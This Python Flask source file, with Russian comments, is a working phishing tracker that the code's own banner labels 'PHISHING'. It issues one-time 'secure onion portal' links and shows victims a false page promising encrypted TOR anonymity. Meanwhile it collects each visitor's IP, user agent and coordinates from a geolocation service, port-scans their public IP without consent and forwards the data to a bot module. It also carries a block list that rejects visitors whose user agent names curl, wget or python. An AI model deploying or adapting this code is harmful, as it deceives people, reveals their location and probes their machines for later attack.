from flask import Flask, request, abort, jsonify
import requests
import random
import string
import time
import os
import re
import socket
import threading
import hashlib
import ipaddress
from functools import wraps
from user_agents import parse

app = Flask(__name__)

# Конфигурация безопасности
app.config['MAX_TOKENS'] = 50
app.config['RATE_LIMIT'] = 30
app.config['MAX_REQUESTS_PER_MINUTE'] = 10
app.config['BLOCK_DURATION'] = 3600

# Хранилища
request_counts = {}
ip_blacklist = {}
tracking_data = {}
active_tokens = set()

def get_real_client_port():
    """Получение реального порта клиента"""
    try:
        # Порт из WSGI environment
        client_port = request.environ.get('REMOTE_PORT')
        
        # Для обратных прокси (nginx, apache)
        x_real_port = request.headers.get('X-Real-Port')
        x_forwarded_port = request.headers.get('X-Forwarded-Port')
        
        # Приоритет: заголовки прокси > WSGI
        if x_real_port and x_real_port.isdigit():
            return int(x_real_port)
        elif x_forwarded_port and x_forwarded_port.isdigit():
            ports = x_forwarded_port.split(',')
            if ports:
                return int(ports[0].strip())
        elif client_port:
            return int(client_port)
            
    except (ValueError, TypeError):
        pass
    
    return "N/A"

def get_client_network_info(ip):
    """Получение расширенной сетевой информации"""
    try:
        # Получаем hostname
        hostname = socket.getfqdn(ip)
        
        # Определяем тип IP
        ip_type = "IPv4"
        try:
            if ipaddress.ip_address(ip).version == 6:
                ip_type = "IPv6"
        except:
            pass
            
        return {
            'hostname': hostname if hostname != ip else "N/A",
            'ip_type': ip_type,
            'real_port': get_real_client_port()
        }
    except:
        return {
            'hostname': "N/A",
            'ip_type': "N/A", 
            'real_port': get_real_client_port()
        }

def rate_limit_with_ban(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        current_time = time.time()
        
        if ip in ip_blacklist:
            if current_time - ip_blacklist[ip] < app.config['BLOCK_DURATION']:
                abort(403, "IP temporarily blocked")
            else:
                del ip_blacklist[ip]
        
        if is_bot_user_agent(user_agent):
            ip_blacklist[ip] = current_time
            abort(403, "Bot detected")
        
        if ip not in request_counts:
            request_counts[ip] = []
        
        request_counts[ip] = [t for t in request_counts[ip] if current_time - t < 3600]
        
        if len(request_counts[ip]) >= app.config['RATE_LIMIT']:
            ip_blacklist[ip] = current_time
            abort(429, "Rate limit exceeded")
        
        recent_requests = [t for t in request_counts[ip] if current_time - t < 60]
        if len(recent_requests) >= app.config['MAX_REQUESTS_PER_MINUTE']:
            abort(429, "Too many requests")
        
        request_counts[ip].append(current_time)
        return f(*args, **kwargs)
    return decorated_function

def is_bot_user_agent(user_agent):
    if not user_agent:
        return True
        
    ua_lower = user_agent.lower()
    bot_signatures = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
    
    for signature in bot_signatures:
        if signature in ua_lower:
            return True
    
    try:
        parsed_ua = parse(user_agent)
        if parsed_ua.is_bot:
            return True
    except:
        pass
    
    return False

def validate_token(token):
    if not token or len(token) != 20:
        return False
    if not re.match(r'^[a-z0-9]+$', token):
        return False
    return True

def generate_token():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(20))

def get_ip_info(ip):
    try:
        if ipaddress.ip_address(ip).is_private:
            return {}
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if response.status_code == 200:
            return response.json()
        return {}
    except:
        return {}

def scan_port(target_ip, port, timeout=0.5):
    """Сканирование порта"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_ip, port))
        sock.close()
        
        if result == 0:
            return "open"
        elif result == 111:
            return "closed"
        else:
            return "filtered"
    except:
        return "error"

def fast_port_scan(target_ip):
    """Быстрое сканирование портов"""
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443]
    port_results = {"open": [], "closed": [], "filtered": []}
    
    def check_port(port):
        status = scan_port(target_ip, port, 0.3)
        port_results[status].append(port)
    
    threads = []
    for port in common_ports:
        thread = threading.Thread(target=check_port, args=(port,))
        threads.append(thread)
        thread.start()
        time.sleep(0.01)
    
    for thread in threads:
        thread.join(timeout=2)
    
    return port_results

def get_port_service(port):
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 
        993: "IMAPS", 995: "POP3S", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
    }
    return services.get(port, f"Port {port}")

def start_bot(info, port_results, network_info):
    try:
        from bot import send_info
        send_info(info, port_results, network_info)
    except Exception as e:
        print(f"Bot error: {e}")

@app.route('/')
@rate_limit_with_ban
def index():
    if len(active_tokens) >= app.config['MAX_TOKENS']:
        abort(503, "Service temporarily unavailable")
    
    token = generate_token()
    active_tokens.add(token)
    tracking_data[token] = None
    
    safe_url = f"https://onion-web.onrender.com/{token}"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Portal</title>
        <style>
            body {{ 
                background: #000; 
                color: #00ff00; 
                font-family: 'Courier New', monospace; 
                text-align: center; 
                padding: 50px;
            }}
            .container {{
                border: 2px solid #00ff00;
                border-radius: 10px;
                padding: 30px;
                background: rgba(0, 255, 0, 0.05);
            }}
            .url-box {{ 
                background: #111; 
                padding: 20px; 
                margin: 20px; 
                border: 1px solid #00ff00; 
                word-break: break-all;
            }}
            .pulse {{ 
                animation: pulse 3s infinite; 
            }}
            @keyframes pulse {{ 
                0% {{ opacity: 1; }} 
                50% {{ opacity: 0.6; }} 
                100% {{ opacity: 1; }} 
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="pulse">SECURE ONION PORTAL</h1>
            <div>Your secure tracking link:</div>
            <div class="url-box">{safe_url}</div>
        </div>
    </body>
    </html>
    """
    
    return html_content

@app.route('/<token>')
@rate_limit_with_ban
def track_visit(token):
    if not validate_token(token) or token not in active_tokens:
        abort(404, "Secure link expired or invalid")
    
    user_agent = request.headers.get('User-Agent', '')
    if is_bot_user_agent(user_agent):
        abort(403, "Automated access detected")
    
    # Удаляем токен сразу после использования
    active_tokens.discard(token)
    
    ip = request.remote_addr
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    
    # Получаем реальную сетевую информацию
    network_info = get_client_network_info(ip)
    
    # Получаем информацию об IP
    ip_info = get_ip_info(ip)
    
    # Сканирование портов (только для публичных IP)
    port_results = {"open": [], "closed": [], "filtered": []}
    try:
        if not ipaddress.ip_address(ip).is_private:
            print(f"🔍 Scanning ports for {ip}")
            port_results = fast_port_scan(ip)
            print(f"📡 Scan completed: {len(port_results['open'])} open ports")
    except:
        pass
    
    info = {
        'ip': ip,
        'user_agent': user_agent[:200],
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
    }
    
    tracking_data[token] = info
    
    # Отправляем информацию в бот
    start_bot(info, port_results, network_info)
    
    # Генерируем новую ссылку
    new_token = generate_token()
    active_tokens.add(new_token)
    tracking_data[new_token] = None
    
    safe_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Connection Established</title>
        <style>
            body { 
                background: #000; 
                color: #00ff00; 
                font-family: 'Courier New', monospace; 
                padding: 50px; 
                text-align: center;
            }
            .terminal {
                border: 1px solid #00ff00;
                padding: 30px;
                background: rgba(0, 255, 0, 0.02);
            }
            .loading { 
                animation: blink 1.5s infinite; 
            }
            @keyframes blink { 
                0%, 50% { opacity: 1; } 
                51%, 100% { opacity: 0; } 
            }
        </style>
    </head>
    <body>
        <div class="terminal">
            <h1>SECURE CONNECTION ESTABLISHED</h1>
            <p>Encryption: AES-256-GCM<span class="loading">...</span></p>
            <p>Protocol: TOR v3</p>
            <div style="margin-top: 30px; color: #888;">
                <p>All connections are encrypted and anonymized</p>
            </div>
        </div>
    </body>
    </html>
    """
    
    return safe_html

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

if __name__ == "__main__":
    banner = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
    """
    print(banner)
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting server on port {port}")
    print("🌐 Available at: https://onion-web.onrender.com")
    print("🔍 Real client port detection: ACTIVE")
    
    app.run(host='0.0.0.0', port=port, debug=False)
